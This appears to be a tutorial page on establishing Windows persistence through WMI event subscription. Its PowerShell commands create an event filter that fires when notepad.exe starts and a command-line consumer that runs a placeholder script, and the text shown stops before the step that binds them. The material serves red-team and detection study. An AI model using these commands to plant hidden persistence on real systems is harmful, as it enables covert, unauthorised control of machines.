---
legal-banner: true
---

### **Introduction**

Windows Management Instrumentation (**WMI**) is a powerful feature in Windows for system management and monitoring.  
**WMI Event Subscription** can be used for persistence by executing scripts or programs automatically when certain system events occur.  


### **Step-by-Step: Establishing Persistence Using WMI Event Subscription**

1. **Identify the Trigger Event**  
   Decide what event should trigger the payload.  
   Example: `__InstanceCreationEvent` (occurs when a new instance of a WMI class is created).


2. **Create an Event Filter**  
   Define the conditions under which the event will trigger using WQL (WMI Query Language):  

    ```powershell
    New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{
        Name = 'MyEventFilter';
        EventNamespace = 'root\cimv2';
        QueryLanguage = 'WQL';
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 
                WHERE TargetInstance ISA 'Win32_Process' 
                AND TargetInstance.Name = 'notepad.exe'"
    }
    ```
    
3. **Create an Event Consumer**
    Specify the action to take when the filter condition is met (e.g., execute a script):

    ```powershell
    New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property @{
        Name = 'MyEventConsumer';
        CommandLineTemplate = "C:\\Path\\To\\Your\\Script.bat"
    }
    ```